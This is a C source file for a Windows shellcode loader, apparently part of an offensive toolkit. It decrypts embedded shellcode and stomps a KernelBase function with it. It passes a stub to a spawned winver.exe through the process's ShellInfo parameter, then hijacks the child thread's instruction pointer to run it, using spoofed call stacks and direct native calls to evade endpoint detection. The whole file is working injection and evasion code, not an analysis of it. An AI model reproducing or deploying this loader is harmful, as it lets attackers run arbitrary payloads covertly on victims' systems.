#include <windows.h>
#include "native.h"
#include "tcg.h"
#include "dfr.h"
#include "shellwriter.h"
#include "spoof.h"
#include "resource.h"

#define SCW_STOMP_MODULE "KernelBase.dll"
#define SCW_STOMP_FUNC "QueryDosDeviceW"

char __SC__[0] __attribute__((section("sc")));
char __MASK__[0] __attribute__((section("mask")));
char __PDATA__[0] __attribute__((section("pdata")));

void go(void);

static __attribute__((always_inline)) inline ULONG_PTR
sc(PVOID fn, int argc,
   ULONG_PTR a0, ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3,
   ULONG_PTR a4, ULONG_PTR a5, ULONG_PTR a6, ULONG_PTR a7,
   ULONG_PTR a8, ULONG_PTR a9, ULONG_PTR a10, ULONG_PTR a11)
{
    FUNCTION_CALL call;
    int _j;
    for (_j = 0; _j < (int)sizeof(call); _j++)
        ((u8 *)&call)[_j] = 0;
    call.ptr = fn;
    call.argc = argc;
    call.args[0] = a0;
    call.args[1] = a1;
    call.args[2] = a2;
    call.args[3] = a3;
    call.args[4] = a4;
    call.args[5] = a5;
    call.args[6] = a6;
    call.args[7] = a7;
    call.args[8] = a8;
    call.args[9] = a9;
    call.args[10] = a10;
    call.args[11] = a11;
    return spoof_call(&call);
}

void go()
{
    dprintf("[+] === START LOADER go() ===\n");

    /* register PIC unwind data — makes our frames walkable by the OS stack walker */
    {
        RESOURCE *pr = (RESOURCE *)&__PDATA__;
        DWORD cnt = pr->length / sizeof(RUNTIME_FUNCTION);
        KERNEL32$RtlAddFunctionTable((PRUNTIME_FUNCTION)pr->value, cnt, (DWORD64)go);
        dprintf("[+] RtlAddFunctionTable: %u entries base=0x%llx\n", cnt, (u64)go);
    }

    /* unmask shellcode */
    RESOURCE *masked_sc = (RESOURCE *)GETRESOURCE(__SC__);
    RESOURCE *mask_key = (RESOURCE *)GETRESOURCE(__MASK__);

    char unmasked_sc[masked_sc->length];
    resource_unmask(masked_sc, mask_key, (u8 *)unmasked_sc);

    /* BTIT/RUTS for child stub's synthetic call chain */
    PVOID hK32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    PVOID hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    u64 btit_addr = (u64)KERNEL32$GetProcAddress((HMODULE)hK32, "BaseThreadInitThunk") + 0x17;
    u64 ruts_addr = (u64)KERNEL32$GetProcAddress((HMODULE)hNtdll, "RtlUserThreadStart") + 0x2c;
    dprintf("[+] btit=0x%llx ruts=0x%llx\n", btit_addr, ruts_addr);

    /* build null-free stub */
    u8 stub[SCW_STUB_SIZE(masked_sc->length)];
    int _i;
    for (_i = 0; _i < SCW_STUB_SIZE(masked_sc->length); _i++)
        stub[_i] = 0;

    SCW w;
    scw_init(&w, stub, sizeof(stub));
    scw_stomp_and_call(&w,
                       (u64)KERNEL32$VirtualProtect,
                       SCW_STOMP_MODULE, SCW_STOMP_FUNC,
                       (const u8 *)unmasked_sc, masked_sc->length,
                       btit_addr, ruts_addr);

    dprintf("[+] stub: %d bytes, nulls: %s\n",
            w.len, scw_check_nulls(&w) == -1 ? "none" : "BUG");

    /* spawn winver.exe with stub in ShellInfo */
    wchar_t ntPath[] = {
        L'\\', L'?', L'?', L'\\',
        L'C', L':', L'\\',
        L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\',
        L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\',
        L'w', L'i', L'n', L'v', L'e', L'r', L'.', L'e', L'x', L'e',
        L'\0'};

    UNICODE_STRING imagePath = {
        .Buffer = ntPath,
        .Length = (USHORT)(sizeof(ntPath) - sizeof(wchar_t)),
        .MaximumLength = sizeof(ntPath)};

    UNICODE_STRING shellInfoStr = {
        .Buffer = (PWSTR)stub,
        .Length = (USHORT)w.len,
        .MaximumLength = (USHORT)sizeof(stub)};

    PRTL_USER_PROCESS_PARAMETERS procParams = NULL;

    dprintf("[+] imagePath.Length=%u shellInfoStr.Length=%u\n",
            imagePath.Length, shellInfoStr.Length);
    dprintf("[+] calling RtlCreateProcessParametersEx\n");
    NTSTATUS status = NTDLL$RtlCreateProcessParametersEx(
        &procParams, &imagePath,
        NULL, NULL, NULL, NULL, NULL, NULL,
        &shellInfoStr, NULL,
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
    dprintf("[+] RtlCreateProcessParametersEx: 0x%X procParams=0x%llx\n",
            status, (u64)procParams);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] RtlCreateProcessParametersEx: 0x%X\n", status);
        return;
    }

    PS_CREATE_INFO createInfo = {0};
    createInfo.Size = sizeof(PS_CREATE_INFO);

    PS_ATTRIBUTE_LIST attrList = {0};
    attrList.TotalLength = sizeof(PS_ATTRIBUTE_LIST);
    attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Size = imagePath.Length;
    attrList.Attributes[0].ValuePtr = imagePath.Buffer;
    attrList.Attributes[0].ReturnLength = NULL;

    HANDLE hProcess = NULL, hThread = NULL;

    dprintf("[+] calling NtCreateUserProcess\n");
    status = (NTSTATUS)sc(
        (PVOID)NTDLL$NtCreateUserProcess, 11,
        (ULONG_PTR)&hProcess, (ULONG_PTR)&hThread,
        (ULONG_PTR)PROCESS_ALL_ACCESS, (ULONG_PTR)THREAD_ALL_ACCESS,
        (ULONG_PTR)NULL, (ULONG_PTR)NULL, (ULONG_PTR)0, (ULONG_PTR)0,
        (ULONG_PTR)procParams, (ULONG_PTR)&createInfo, (ULONG_PTR)&attrList, 0);
    dprintf("[+] NtCreateUserProcess: 0x%X hProcess=0x%llx hThread=0x%llx\n",
            status, (u64)hProcess, (u64)hThread);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtCreateUserProcess: 0x%X\n", status);
        return;
    }

    /* spin ~300ms for child PEB to settle */
    unsigned long long start, now;
    unsigned long long cycles = 300 * 3000000ULL;
    __asm__ volatile("rdtsc" : "=A"(start));
    do
    {
        __asm__ volatile("rdtsc" : "=A"(now));
    } while ((now - start) < cycles);

    /* read child PEB → ProcessParameters → ShellInfo.Buffer */
    PROCESS_BASIC_INFORMATION pbi = {0};
    DWORD retLen = 0;
    SIZE_T bytesRead = 0;

    dprintf("[+] calling NtQueryInformationProcess\n");
    status = (NTSTATUS)sc(
        (PVOID)NTDLL$NtQueryInformationProcess, 5,
        (ULONG_PTR)hProcess, 0,
        (ULONG_PTR)&pbi, (ULONG_PTR)sizeof(pbi), (ULONG_PTR)&retLen,
        0, 0, 0, 0, 0, 0, 0);
    dprintf("[+] NtQueryInformationProcess: 0x%X PEB=0x%llx\n",
            status, (u64)pbi.PebBaseAddress);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtQueryInformationProcess: 0x%X\n", status);
        return;
    }

    PEB pebLocal = {0};
    dprintf("[+] calling NtReadVirtualMemory (PEB)\n");
    status = (NTSTATUS)sc(
        (PVOID)NTDLL$NtReadVirtualMemory, 5,
        (ULONG_PTR)hProcess, (ULONG_PTR)pbi.PebBaseAddress,
        (ULONG_PTR)&pebLocal, (ULONG_PTR)sizeof(pebLocal), (ULONG_PTR)&bytesRead,
        0, 0, 0, 0, 0, 0, 0);
    dprintf("[+] NtReadVirtualMemory (PEB): 0x%X ProcessParameters=0x%llx\n",
            status, (u64)pebLocal.ProcessParameters);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtReadVirtualMemory (PEB): 0x%X\n", status);
        return;
    }

    RTL_USER_PROCESS_PARAMETERS parameters = {0};
    dprintf("[+] calling NtReadVirtualMemory (ProcessParameters)\n");
    status = (NTSTATUS)sc(
        (PVOID)NTDLL$NtReadVirtualMemory, 5,
        (ULONG_PTR)hProcess, (ULONG_PTR)pebLocal.ProcessParameters,
        (ULONG_PTR)&parameters, (ULONG_PTR)sizeof(parameters), (ULONG_PTR)&bytesRead,
        0, 0, 0, 0, 0, 0, 0);
    dprintf("[+] NtReadVirtualMemory (ProcessParameters): 0x%X ShellInfo.Buffer=0x%llx\n",
            status, (u64)parameters.ShellInfo.Buffer);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtReadVirtualMemory (ProcessParameters): 0x%X\n", status);
        return;
    }

    /* make stub page executable in child */
    PVOID shellcode = (PVOID)parameters.ShellInfo.Buffer;
    ULONG_PTR unaligned = (ULONG_PTR)shellcode;
    PVOID base = (PVOID)(unaligned & ~(ULONG_PTR)(4096 - 1));
    SIZE_T shellcodeSize = (SIZE_T)w.len + (unaligned - (ULONG_PTR)base);
    ULONG oldp = 0;

    dprintf("[+] shellcode=0x%llx base=0x%llx size=0x%llx\n",
            (u64)shellcode, (u64)base, (u64)shellcodeSize);
    dprintf("[+] calling NtProtectVirtualMemory\n");
    status = (NTSTATUS)sc(
        (PVOID)NTDLL$NtProtectVirtualMemory, 5,
        (ULONG_PTR)hProcess, (ULONG_PTR)&base,
        (ULONG_PTR)&shellcodeSize, (ULONG_PTR)PAGE_EXECUTE_READ, (ULONG_PTR)&oldp,
        0, 0, 0, 0, 0, 0, 0);
    dprintf("[+] NtProtectVirtualMemory: 0x%X\n", status);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtProtectVirtualMemory: 0x%X\n", status);
        return;
    }

    /* hijack child thread RIP → stub */
    __attribute__((aligned(16))) CONTEXT ctx_storage = {0};
    CONTEXT *ctx = &ctx_storage;
    int _z;
    for (_z = 0; _z < (int)sizeof(CONTEXT); _z++)
        ((u8 *)ctx)[_z] = 0;
    ctx->ContextFlags = CONTEXT_CONTROL;

    dprintf("[+] calling NtGetContextThread hThread=0x%llx\n", (u64)hThread);
    status = (NTSTATUS)sc(
        (PVOID)NTDLL$NtGetContextThread, 2,
        (ULONG_PTR)hThread, (ULONG_PTR)ctx,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    dprintf("[+] NtGetContextThread: 0x%X Rip=0x%llx\n",
            status, (u64)ctx->Rip);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtGetContextThread: 0x%X\n", status);
        return;
    }

    ctx->Rip = (DWORD64)shellcode;
    dprintf("[+] new Rip=0x%llx\n", (u64)ctx->Rip);

    dprintf("[+] calling NtSetContextThread\n");
    status = (NTSTATUS)sc(
        (PVOID)NTDLL$NtSetContextThread, 2,
        (ULONG_PTR)hThread, (ULONG_PTR)ctx,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    dprintf("[+] NtSetContextThread: 0x%X\n", status);
    if (!NT_SUCCESS(status))
    {
        dprintf("[-] NtSetContextThread: 0x%X\n", status);
        return;
    }

    dprintf("[+] RIP hijacked → shellcode\n");
    dprintf("[+] === EXIT LOADER ===\n");
}
